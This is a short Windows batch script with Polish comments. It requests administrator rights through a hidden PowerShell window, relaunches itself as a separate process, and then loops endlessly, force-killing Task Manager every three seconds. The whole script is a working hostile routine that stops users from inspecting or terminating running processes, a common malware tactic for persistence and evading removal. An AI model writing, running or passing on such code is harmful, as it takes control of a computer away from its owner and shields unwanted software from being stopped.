@echo off
setlocal EnableDelayedExpansion

:: Sprawdź uprawnienia administratora
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%~f0' -Verb runAs" >nul 2>&1
    exit /b
)

:: Włącz auto-restart przez uruchomienie kopii samego siebie i zakończenie tego procesu
if not defined RESTARTED (
    set RESTARTED=1
    start "" "%~f0"
    exit /b
)

:petla
tasklist /fi "imagename eq Taskmgr.exe" | findstr /i "Taskmgr.exe" >nul
if !errorlevel!==0 (
    taskkill /f /im Taskmgr.exe >nul 2>&1
)

timeout /t 3 >nul
goto petla
